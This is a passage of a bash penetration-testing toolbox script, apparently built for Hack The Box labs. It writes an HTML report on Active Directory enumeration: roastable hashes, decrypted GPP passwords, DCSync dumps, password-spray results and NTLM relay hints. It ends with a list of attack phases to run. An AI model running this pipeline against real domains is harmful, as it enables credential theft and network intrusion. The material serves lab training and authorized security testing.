.section-hdr .sh-icon { font-size: 14px; }
.section-hdr h2 { font-size: 13px; font-weight: 600; color: var(--text); flex: 1; }
.section-hdr .sh-cnt {
  font-size: 10px; color: var(--dim); background: var(--bg4);
  padding: 1px 7px; border-radius: 10px;
}
.section-hdr .arrow {
  color: var(--dim); font-size: 10px; width: 14px;
  transition: transform .2s var(--ease);
}
.section-hdr.collapsed .arrow { transform: rotate(-90deg); }

.section-body { padding: 16px 18px; }
.section-body.collapsed { display: none; }
@keyframes fadeSlide { from { opacity:0; transform: translateY(-5px); } to { opacity:1; transform:none; } }
.section-body:not(.collapsed) { animation: fadeSlide .15s ease; }

/* ── Code blocks ──────────────────────────────────────────── */
.code-wrap { position: relative; }
.copy-btn {
  position: absolute; top: 7px; right: 7px;
  background: var(--bg3); border: 1px solid var(--border);
  border-radius: 4px; color: var(--dim); font-size: 11px;
  padding: 3px 9px; cursor: pointer; opacity: 0;
  transition: opacity .15s, background .12s, color .12s, border-color .12s;
  z-index: 5; font-family: inherit;
}
.code-wrap:hover .copy-btn { opacity: 1; }
.copy-btn:hover { background: var(--bg4); color: var(--text); }
.copy-btn.ok { color: var(--green); border-color: var(--green); }

pre.code {
  background: var(--bg); border: 1px solid var(--border); border-radius: 6px;
  padding: 14px 16px; overflow-x: auto;
  font-family: 'Cascadia Code','Fira Code','JetBrains Mono','Consolas',monospace;
  font-size: 12px; line-height: 1.65; color: var(--text);
  white-space: pre-wrap; word-break: break-all;
  max-height: 480px; overflow-y: auto;
}

/* ── Details ──────────────────────────────────────────────── */
details { margin-bottom: 8px; border-radius: 6px; overflow: hidden; }
details summary {
  cursor: pointer; padding: 7px 14px;
  background: var(--bg3); border: 1px solid var(--border);
  font-size: 12px; font-weight: 500; color: var(--cyan);
  list-style: none; display: flex; align-items: center; gap: 7px;
  transition: background .12s;
}
details summary::-webkit-details-marker { display: none; }
details summary::before {
  content: '▶'; font-size: 8px; color: var(--dim);
  transition: transform .18s var(--ease);
}
details[open] summary::before { transform: rotate(90deg); }
details summary:hover { background: var(--bg4); }
details[open] summary { border-radius: 6px 6px 0 0; }
details pre.code { border-radius: 0 0 6px 6px; border-top: none; max-height: 420px; }

/* ── Badges ───────────────────────────────────────────────── */
.badge {
  display: inline-flex; align-items: center; gap: 4px;
  padding: 3px 10px; border-radius: 20px;
  font-size: 11px; font-weight: 600; margin: 2px 3px 2px 0;
}
.badge::before { font-size: 7px; }
.badge.ok  { background: rgba(63,185,80,.1);  color: var(--green);  border: 1px solid rgba(63,185,80,.35); }
.badge.ok::before  { content:'●'; color: var(--green); }
.badge.no  { background: rgba(248,81,73,.1);  color: var(--red);    border: 1px solid rgba(248,81,73,.35); }
.badge.no::before  { content:'●'; color: var(--red); }
.badge.uk  { background: rgba(227,179,65,.1); color: var(--yellow); border: 1px solid rgba(227,179,65,.35); }
.badge.uk::before  { content:'●'; color: var(--yellow); }

/* ── Alerts ───────────────────────────────────────────────── */
.alert {
  padding: 10px 16px; border-radius: 6px; margin-bottom: 11px;
  font-size: 13px; display: flex; align-items: center; gap: 9px;
  border-left: 3px solid;
}
.alert.info    { background: rgba(88,166,255,.06);  border-color: var(--blue);   color: #9ecbff; }
.alert.warn    { background: rgba(227,179,65,.06);  border-color: var(--yellow); color: var(--yellow); }
.alert.danger  { background: rgba(248,81,73,.06);   border-color: var(--red);    color: #ff9492; }
.alert.success { background: rgba(63,185,80,.06);   border-color: var(--green);  color: var(--green); }

/* ── Search highlight ─────────────────────────────────────── */
mark.hl { background: rgba(255,214,0,.22); color: inherit; border-radius: 2px; }
.section.s-hide { display: none; }

/* ── Toast ────────────────────────────────────────────────── */
#toast {
  position: fixed; bottom: 26px; left: 50%;
  transform: translateX(-50%) translateY(8px);
  background: var(--bg4); border: 1px solid var(--border);
  color: var(--text); padding: 7px 22px; border-radius: 20px;
  font-size: 13px; opacity: 0; pointer-events: none;
  transition: opacity .22s, transform .22s; z-index: 9999;
}
#toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

/* ── Back to top ──────────────────────────────────────────── */
#backtop {
  position: fixed; bottom: 26px; right: 26px;
  width: 38px; height: 38px; border-radius: 50%;
  background: var(--bg3); border: 1px solid var(--border);
  color: var(--dim); font-size: 15px; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
  opacity: 0; transform: translateY(10px);
  transition: opacity .2s, transform .2s, background .15s, color .15s;
  z-index: 500;
}
#backtop.show { opacity: 1; transform: translateY(0); }
#backtop:hover { background: var(--blue); color: #fff; border-color: var(--blue); }

/* ── Scrollbar ────────────────────────────────────────────── */
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: #484f58; }

/* ── Print ────────────────────────────────────────────────── */
@media print {
  #sidebar, #backtop, #toast { display: none !important; }
  #main { margin-left: 0; max-width: 100%; padding: 16px; }
  .section-body.collapsed { display: block !important; }
  pre.code { max-height: none; overflow: visible; }
}
</style>
EOCSS

    # ── Sidebar + shell elements ──────────────────────────────────────────────
    cat << 'EOSIDE'
</head>
<body>
<div id="toast"></div>
<button id="backtop" title="Back to top">&#8679;</button>

<nav id="sidebar">
  <div class="sb-head">
    <div class="sb-title">
      <div class="sb-logo">&#128203;</div>
      <h1>AD Report<small id="sb-domain"></small></h1>
    </div>
    <input id="q" type="search" placeholder="Search… (press /)" autocomplete="off">
  </div>

  <div class="sb-nav">
    <div class="sb-grp-label">Overview</div>
    <ul>
      <li><a href="#overview"><span class="ni">&#127919;</span>Target &amp; Status</a></li>
      <li><a href="#findings"><span class="ni">&#128202;</span>Key Findings</a></li>
    </ul>

    <div class="sb-grp-label">Énumération</div>
    <ul>
      <li><a href="#users"><span class="ni">&#128101;</span>Users</a></li>
      <li><a href="#hashes"><span class="ni">&#128273;</span>Hashes</a></li>
      <li><a href="#smb"><span class="ni">&#128194;</span>SMB</a></li>
      <li><a href="#ldap"><span class="ni">&#128220;</span>LDAP</a></li>
      <li><a href="#passpol"><span class="ni">&#128274;</span>Password Policy</a></li>
      <li><a href="#hosts"><span class="ni">&#128441;</span>Host Map</a></li>
      <li><a href="#nmap"><span class="ni">&#128270;</span>Nmap</a></li>
      <li><a href="#dns"><span class="ni">&#127760;</span>DNS</a></li>
      <li><a href="#snmp"><span class="ni">&#128225;</span>SNMP</a></li>
      <li><a href="#ftp"><span class="ni">&#128228;</span>FTP</a></li>
    </ul>

    <div class="sb-grp-label">Attack Surface</div>
    <ul>
      <li><a href="#adcs"><span class="ni">&#128220;</span>ADCS / Certipy</a></li>
      <li><a href="#bloodyad"><span class="ni">&#129514;</span>BloodyAD</a></li>
      <li><a href="#mssql"><span class="ni">&#128451;</span>MSSQL</a></li>
      <li><a href="#winrm"><span class="ni">&#128421;</span>WinRM</a></li>
      <li><a href="#gpo"><span class="ni">&#128203;</span>GPO</a></li>
      <li><a href="#bloodhound"><span class="ni">&#129407;</span>BloodHound</a></li>
      <li><a href="#gpp"><span class="ni">&#128165;</span>GPP / Creds</a></li>
      <li><a href="#secretsdump"><span class="ni">&#128221;</span>Secretsdump</a></li>
      <li><a href="#spray"><span class="ni">&#128166;</span>Password Spray</a></li>
    </ul>

    <div class="sb-grp-label">Hints</div>
    <ul>
      <li><a href="#postauth"><span class="ni">&#128640;</span>Post-auth</a></li>
      <li><a href="#hashcrack"><span class="ni">&#128295;</span>Hash Crack</a></li>
      <li><a href="#relay"><span class="ni">&#128260;</span>NTLM Relay</a></li>
      <li><a href="#tooling"><span class="ni">&#128736;</span>Tooling</a></li>
    </ul>
  </div>

  <div class="sb-footer">
    <button class="sb-btn" onclick="expandAll()">&#9660; Expand All</button>
    <button class="sb-btn" onclick="collapseAll()">&#9650; Collapse All</button>
  </div>
  <div class="sb-hint">Press / to search &nbsp;·&nbsp; C to copy</div>
</nav>
EOSIDE

    printf '<div id="main">\n'

    # ── Page header ───────────────────────────────────────────────────────────
    printf '<div id="overview" class="page-header">\n'
    printf '<h1>Rapport d''énumération AD</h1>\n'
    printf '<div class="meta">\n'
    printf '<span><b>Target:</b> %s</span>\n' "$TARGET"
    printf '<span><b>Domain:</b> %s</span>\n' "$DOMAIN"
    printf '<span><b>DC:</b> %s</span>\n' "$DC"
    printf '<span><b>Profile:</b> %s | %s</span>\n' "$RUN_PROFILE" "$PHASE_PACK"
    printf '<span><b>Auth:</b> %s</span>\n' \
      "$([ "$AUTH_MODE" = "1" ] && printf 'Authenticated (%s)' "$AD_USER_RAW" || echo 'Anonymous')"
    printf '<span><b>Generated:</b> %s</span>\n' "$gen_date"
    printf '</div>\n'

    # Auth status badges
    printf '<div style="margin-top:14px">\n'
    _badge "$a_smb"   "SMB"
    _badge "$a_ldap"  "LDAP"
    _badge "$a_rpc"   "RPC"
    _badge "$a_winrm" "WinRM"
    _badge "$a_mssql" "MSSQL"
    _badge "$a_tgt"   "TGT"
    printf '\n</div>\n'

    # SMB signing alert
    if [ "$a_sign" = "1" ]; then
      printf '<div class="alert warn" style="margin-top:12px">SMB Signing REQUIRED — NTLM relay not directly possible.</div>\n'
    elif [ "$a_sign" = "0" ]; then
      printf '<div class="alert success" style="margin-top:12px">SMB Signing NOT REQUIRED — NTLM relay may be possible!</div>\n'
    fi

    # Recon status badges
    printf '<div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">\n'
    printf '<span style="font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.08em;margin-right:10px">Recon:</span>\n'
    _badge "$r_nmap"   "Nmap"
    _badge "$r_ntp"    "NTP"
    _badge "$r_web"    "Web"
    _badge "$r_bh"     "BloodHound"
    _badge "$r_ldd"    "LdapDump"
    _badge "$r_dns"    "DNS"
    _badge "$r_adcs"   "ADCS"
    _badge "$r_bloody" "BloodyAD"
    _badge "$r_mssql"  "MSSQL"
    _badge "$r_snmp"   "SNMP"
    _badge "$r_ftp"    "FTP"
    _badge "$r_ldaps"  "LDAPS"
    _badge "$r_gpo"    "GPO"
    _badge "$r_sd"     "Secretsdump"
    _badge "$r_spray"  "Spray"
    printf '\n</div>\n</div>\n'

    # ── Key findings cards ────────────────────────────────────────────────────
    printf '<div id="findings" class="cards" style="margin-top:20px">\n'
    printf '<div class="card blue"><div class="val">%s</div><div class="lbl">Users Found</div></div>\n' "$users_count"
    printf '<div class="card %s"><div class="val">%s</div><div class="lbl">AS-REP Hashes</div></div>\n' "$asrep_color" "$asrep_count"
    printf '<div class="card %s"><div class="val">%s</div><div class="lbl">Kerberoast Hashes</div></div>\n' "$kerb_color" "$kerberoast_count"
    printf '<div class="card purple"><div class="val">%s</div><div class="lbl">Kerberoastable (LDAP)</div></div>\n' "$kerb_ldap_count"
    printf '<div class="card green"><div class="val">%s</div><div class="lbl">SMB Shares</div></div>\n' "$shares_count"
    printf '<div class="card orange"><div class="val">%s</div><div class="lbl">Extra Hosts</div></div>\n' "${HOSTS_FOUND:-0}"
    printf '</div>\n'

    # ── Users ─────────────────────────────────────────────────────────────────
    printf '<div id="users" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128101;</span><h2>Users (%s)</h2><span class="arrow">&#9660;</span></div>\n' "$users_count"
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' "$(_rf users.txt)"

    # ── Hashes ────────────────────────────────────────────────────────────────
    printf '<div id="hashes" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128273;</span><h2>Hashes</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">\n'
    printf '<details open><summary>AS-REP Hashes (%s)</summary><pre class="code">%s</pre></details>\n' \
      "$asrep_count" "$(_rf asrep_roast.txt)"
    printf '<details><summary>Kerberoast Hashes (%s)</summary><pre class="code">%s</pre></details>\n' \
      "$kerberoast_count" "$(_rf kerberos/kerberoast_hashes.txt)"
    printf '</div>\n</div>\n'

    # ── SMB ───────────────────────────────────────────────────────────────────
    printf '<div id="smb" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128194;</span><h2>SMB</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">\n'
    printf '<details open><summary>Shares</summary><pre class="code">%s</pre></details>\n' \
      "$(_rf smb_shares/shares_target.txt)"
    if [ -s smb_enum.txt ]; then
      printf '<details><summary>SMB Enum</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf smb_enum.txt)"
    fi
    printf '</div>\n</div>\n'

    # ── LDAP ──────────────────────────────────────────────────────────────────
    printf '<div id="ldap" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128220;</span><h2>LDAP</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">\n'
    printf '<details open><summary>Privileged Accounts (adminCount=1)</summary><pre class="code">%s</pre></details>\n' \
      "$(_rf ldap_admincount.txt)"
    printf '<details><summary>ASREPRoastable Candidates</summary><pre class="code">%s</pre></details>\n' \
      "$(_rf ldap_asrep_candidates.txt)"
    printf '<details><summary>Kerberoastable Accounts</summary><pre class="code">%s</pre></details>\n' \
      "$(_rf ldap_kerberoastable.txt)"
    printf '<details><summary>Password Never Expires</summary><pre class="code">%s</pre></details>\n' \
      "$(_rf ldap_pwdneverexpires.txt)"
    if [ -s ldap_full.txt ]; then
      printf '<details><summary>LDAP Full Dump</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf ldap_full.txt)"
    fi
    printf '</div>\n</div>\n'

    # ── Password Policy ───────────────────────────────────────────────────────
    printf '<div id="passpol" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128274;</span><h2>Password Policy</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf enum4linux/passpol.txt)"

    # ── Additional Hosts ──────────────────────────────────────────────────────
    printf '<div id="hosts" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128441;</span><h2>Additional Hosts Discovered (%s)</h2><span class="arrow">&#9660;</span></div>\n' "${HOSTS_FOUND:-0}"
    printf '<div class="section-body">\n'
    if [ "${HOSTS_FOUND:-0}" -gt 0 ] 2>/dev/null; then
      printf '<div class="alert success">%s additional host(s) found beyond the primary target.</div>\n' "${HOSTS_FOUND:-0}"
      printf '<details open><summary>Host Map (compact)</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf hosts_discovery/hosts_map.txt)"
      printf '<details><summary>Full Discovery Report</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf hosts_discovery/discovered_hosts.txt)"
      if [ -s hosts_discovery/arp_cache.txt ]; then
        printf '<details><summary>ARP / Neighbour Cache</summary><pre class="code">%s</pre></details>\n' \
          "$(_rf hosts_discovery/arp_cache.txt)"
      fi
      if [ -s hosts_discovery/raw_ips.txt ]; then
        printf '<details><summary>Raw IPs extracted from loot</summary><pre class="code">%s</pre></details>\n' \
          "$(_rf hosts_discovery/raw_ips.txt)"
      fi
    else
      printf '<div class="alert info">No additional hosts discovered beyond the primary target.</div>\n'
      if [ -s hosts_discovery/arp_cache.txt ]; then
        printf '<details><summary>ARP / Neighbour Cache</summary><pre class="code">%s</pre></details>\n' \
          "$(_rf hosts_discovery/arp_cache.txt)"
      fi
    fi
    printf '</div>\n</div>\n'

    # ── Nmap ──────────────────────────────────────────────────────────────────
    printf '<div id="nmap" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128270;</span><h2>Nmap</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_nmap_content)"

    # ── DNS ───────────────────────────────────────────────────────────────────
    printf '<div id="dns" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#127760;</span><h2>Énumération DNS</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content dns_enum)"

    # ── SNMP ──────────────────────────────────────────────────────────────────
    printf '<div id="snmp" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128225;</span><h2>SNMP</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content snmp_enum)"

    # ── FTP ───────────────────────────────────────────────────────────────────
    printf '<div id="ftp" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128228;</span><h2>FTP</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content ftp_enum)"

    # ── ADCS / Certipy ────────────────────────────────────────────────────────
    printf '<div id="adcs" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128220;</span><h2>ADCS / Certipy</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content adcs)"

    # ── BloodyAD ──────────────────────────────────────────────────────────────
    printf '<div id="bloodyad" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#129514;</span><h2>BloodyAD</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content bloodyad)"

    # ── MSSQL ─────────────────────────────────────────────────────────────────
    printf '<div id="mssql" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128451;</span><h2>MSSQL</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content mssql_enum)"

    # ── WinRM ─────────────────────────────────────────────────────────────────
    printf '<div id="winrm" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128421;</span><h2>WinRM</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content winrm_enum)"

    # ── GPO ───────────────────────────────────────────────────────────────────
    printf '<div id="gpo" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128203;</span><h2>GPO</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">%s</div>\n</div>\n' \
      "$(_dir_content gpo)"

    # ── BloodHound ────────────────────────────────────────────────────────────
    printf '<div id="bloodhound" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#129407;</span><h2>BloodHound</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf bloodhound_collect.txt)"

    # ── GPP / Credentials ─────────────────────────────────────────────────────
    printf '<div id="gpp" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128165;</span><h2>GPP / Credential Hits</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body">\n'
    if [ -s gpp_hits.txt ]; then
      printf '<div class="alert danger">GPP passwords found in SYSVOL!</div>\n'
      printf '<details open><summary>GPP Hits</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf gpp_hits.txt)"
    fi
    if [ -s gpp_decrypted.txt ]; then
      printf '<details open><summary>Decrypted GPP Passwords</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf gpp_decrypted.txt)"
    fi
    if [ -s creds_hits.txt ]; then
      printf '<details open><summary>Credential Patterns in Loot</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf creds_hits.txt)"
    fi
    if [ -s dotnet_juicy.txt ]; then
      printf '<details><summary>.NET / Config Juicy Files</summary><pre class="code">%s</pre></details>\n' \
        "$(_rf dotnet_juicy.txt)"
    fi
    printf '</div>\n</div>\n'

    # ── Secretsdump ───────────────────────────────────────────────────────────
    printf '<div id="secretsdump" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128221;</span><h2>Secretsdump / DCSync</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf attack_checks/secretsdump_dcsync.txt)"

    # ── Password Spray ────────────────────────────────────────────────────────
    printf '<div id="spray" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128166;</span><h2>Password Spray Results</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf attack_checks/spray_results.txt)"

    # ── Post-auth Hints ───────────────────────────────────────────────────────
    printf '<div id="postauth" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128640;</span><h2>Post-auth Hints</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf attack_checks/postauth_hints.txt)"

    # ── Hash Crack Hints ──────────────────────────────────────────────────────
    printf '<div id="hashcrack" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128295;</span><h2>Hash Crack Hints (hashcat / john)</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf attack_checks/hash_crack_hints.txt)"

    # ── NTLM Relay ────────────────────────────────────────────────────────────
    printf '<div id="relay" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128260;</span><h2>NTLM Relay Commands</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf relay_hints/ntlm_relay_commands.txt)"

    # ── Résumé de l'outillage ─────────────────────────────────────────────────
    printf '<div id="tooling" class="section">\n'
    printf '<div class="section-hdr" onclick="toggle(this)"><span class="sh-icon">&#128736;</span><h2>Résumé de l''outillage</h2><span class="arrow">&#9660;</span></div>\n'
    printf '<div class="section-body"><pre class="code">%s</pre></div>\n</div>\n' \
      "$(_rf tooling_summary.txt)"

    printf '</div>\n' # end #main

    # ── JavaScript ────────────────────────────────────────────────────────────
    cat << 'EOJS'
<script>
/* ── Toggle section ──────────────────────────────────────── */
function toggle(hdr) {
  const wasCollapsed = hdr.classList.contains('collapsed');
  hdr.classList.toggle('collapsed');
  hdr.nextElementSibling.classList.toggle('collapsed');
  if (wasCollapsed) {
    setTimeout(() => hdr.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 10);
  }
}

/* ── Expand / Collapse all ────────────────────────────────── */
function expandAll() {
  document.querySelectorAll('.section-hdr').forEach(h => {
    h.classList.remove('collapsed');
    h.nextElementSibling.classList.remove('collapsed');
  });
  showToast('All sections expanded');
}
function collapseAll() {
  document.querySelectorAll('.section-hdr').forEach(h => {
    h.classList.add('collapsed');
    h.nextElementSibling.classList.add('collapsed');
  });
  showToast('All sections collapsed');
}

/* ── Animated counters ────────────────────────────────────── */
function animateCounters() {
  document.querySelectorAll('.card .val').forEach(el => {
    const target = parseInt(el.textContent, 10);
    if (isNaN(target) || target === 0) return;
    let n = 0;
    const step = Math.max(1, Math.ceil(target / 28));
    const id = setInterval(() => {
      n = Math.min(n + step, target);
      el.textContent = n;
      if (n >= target) clearInterval(id);
    }, 28);
  });
}

/* ── Copy buttons ─────────────────────────────────────────── */
function initCopyButtons() {
  document.querySelectorAll('pre.code').forEach(pre => {
    const wrap = document.createElement('div');
    wrap.className = 'code-wrap';
    pre.parentNode.insertBefore(wrap, pre);
    wrap.appendChild(pre);
    const btn = document.createElement('button');
    btn.className = 'copy-btn';
    btn.textContent = 'Copy';
    btn.title = 'Copy to clipboard (C)';
    btn.addEventListener('click', e => {
      e.stopPropagation();
      navigator.clipboard.writeText(pre.textContent).then(() => {
        btn.textContent = '✓ Copied';
        btn.classList.add('ok');
        showToast('Copied to clipboard');
        setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 2200);
      }).catch(() => {
        /* fallback */
        const ta = document.createElement('textarea');
        ta.value = pre.textContent;
        ta.style.cssText = 'position:fixed;opacity:0';
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        btn.textContent = '✓ Copied';
        btn.classList.add('ok');
        showToast('Copied to clipboard');
        setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 2200);
      });
    });
    wrap.appendChild(btn);
  });
}

/* ── Toast ────────────────────────────────────────────────── */
function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(t._tid);
  t._tid = setTimeout(() => t.classList.remove('show'), 1800);
}

/* ── Live search ──────────────────────────────────────────── */
function initSearch() {
  const input = document.getElementById('q');
  if (!input) return;

  input.addEventListener('input', () => {
    const raw = input.value.trim();
    const q = raw.toLowerCase();

    /* Remove old highlights */
    document.querySelectorAll('mark.hl').forEach(m => {
      m.parentNode.replaceChild(document.createTextNode(m.textContent), m);
    });

    document.querySelectorAll('.section').forEach(sec => {
      if (!q) { sec.classList.remove('s-hide'); return; }
      const matches = sec.textContent.toLowerCase().includes(q);
      sec.classList.toggle('s-hide', !matches);
      if (matches && raw.length > 1) {
        /* Highlight in pre.code only — safe, no deep DOM walk */
        sec.querySelectorAll('pre.code').forEach(pre => {
          highlightIn(pre, raw);
        });
      }
    });
  });
}

function highlightIn(el, q) {
  const re = new RegExp('(' + q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
  /* Only walk text nodes to avoid breaking HTML */
  const walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT);
  const nodes = [];
  let n;
  while ((n = walker.nextNode())) nodes.push(n);
  nodes.forEach(node => {
    if (!re.test(node.textContent)) return;
    const frag = document.createDocumentFragment();
    node.textContent.split(re).forEach((part, i) => {
      if (i % 2 === 1) {
        const mark = document.createElement('mark');
        mark.className = 'hl';
        mark.textContent = part;
        frag.appendChild(mark);
      } else {
        frag.appendChild(document.createTextNode(part));
      }
    });
    node.parentNode.replaceChild(frag, node);
  });
}

/* ── Nav highlight on scroll ──────────────────────────────── */
function initNavHighlight() {
  const links = document.querySelectorAll('#sidebar a[href^="#"]');
  const obs = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if (!e.isIntersecting) return;
      links.forEach(a => a.classList.remove('active'));
      const a = document.querySelector('#sidebar a[href="#' + e.target.id + '"]');
      if (a) {
        a.classList.add('active');
        a.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
      }
    });
  }, { rootMargin: '-8% 0px -78% 0px' });
  document.querySelectorAll('[id]').forEach(el => obs.observe(el));
}

/* ── Back to top ──────────────────────────────────────────── */
function initBackTop() {
  const btn = document.getElementById('backtop');
  window.addEventListener('scroll', () => {
    btn.classList.toggle('show', window.scrollY > 320);
  }, { passive: true });
  btn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
}

/* ── Keyboard shortcuts ───────────────────────────────────── */
function initKeyboard() {
  document.addEventListener('keydown', e => {
    const tag = e.target.tagName;
    const typing = ['INPUT', 'TEXTAREA'].includes(tag);

    if (e.key === '/' && !typing) {
      e.preventDefault();
      document.getElementById('q').focus();
      return;
    }
    if (e.key === 'Escape') {
      document.getElementById('q').blur();
      document.getElementById('q').value = '';
      document.getElementById('q').dispatchEvent(new Event('input'));
      return;
    }
    if ((e.key === 'c' || e.key === 'C') && !typing && !e.ctrlKey && !e.metaKey) {
      /* Copy the last focused/visible pre */
      const focused = document.activeElement.closest('.code-wrap');
      if (focused) {
        const btn = focused.querySelector('.copy-btn');
        if (btn) btn.click();
      }
    }
    if (e.key === 'e' && !typing) { expandAll(); }
    if (e.key === 'x' && !typing) { collapseAll(); }
  });
}

/* ── Critical pulse on non-zero red cards ─────────────────── */
function markCritical() {
  document.querySelectorAll('.card.red .val').forEach(v => {
    if (parseInt(v.textContent) > 0)
      v.closest('.card').classList.add('crit');
  });
}

/* ── Inject domain in sidebar ─────────────────────────────── */
function setSbDomain() {
  const h1meta = document.querySelector('.meta-row span b');
  const el = document.getElementById('sb-domain');
  if (el && h1meta) {
    const domainSpan = [...document.querySelectorAll('.meta-row span')]
      .find(s => s.querySelector('b') && s.querySelector('b').textContent === 'Domain:');
    if (domainSpan) el.textContent = domainSpan.textContent.replace('Domain:', '').trim();
  }
}

/* ── Boot ─────────────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  animateCounters();
  initCopyButtons();
  initSearch();
  initNavHighlight();
  initBackTop();
  initKeyboard();
  markCritical();
  setSbDomain();
});
</script>
</body>
</html>
EOJS

  } > "$report_file"

  good "Rapport HTML écrit : $OUTDIR/$report_file"
}

htbtoolbox_init_web() {
  htbtoolbox_init_tooling || return 1
  validate_config
  setup_output_dir
  setup_hosts
  if [ "$AUTH_MODE" = "1" ]; then
    AD_USER_BEST="${AD_USER_BEST:-$AD_USER_RAW}"
  fi
  nxc_detect
  if [ "$AUTH_MODE" = "1" ]; then
    select_best_user
    validate_creds
  fi
}

htbtoolbox_run_full() {
  main_menu
  ask_creds
  interactive_options
  choose_target
  choose_outdir
  validate_config
  show_operation_plan
  setup_output_dir
  fix_outdir_perms_for_kali
  setup_hosts
  htbtoolbox_init_tooling
  phase_nmap_baseline
  phase_smb_signing_check
  phase_snmp_enum
  phase_ftp_enum
  phase_web_enum
  nxc_detect

  if [ "$AUTH_MODE" = "1" ]; then
    select_best_user
    good "Format utilisateur sélectionné : ${AD_USER_BEST}"
  fi

  validate_creds
  phase_ntp_sync
  run_gettgt_auto
  nxc_autoprobe_anonymous
  nxc_autoprobe_dynamic

  smb_enum_and_loot
  dotnet_secrets
  ldap_enum
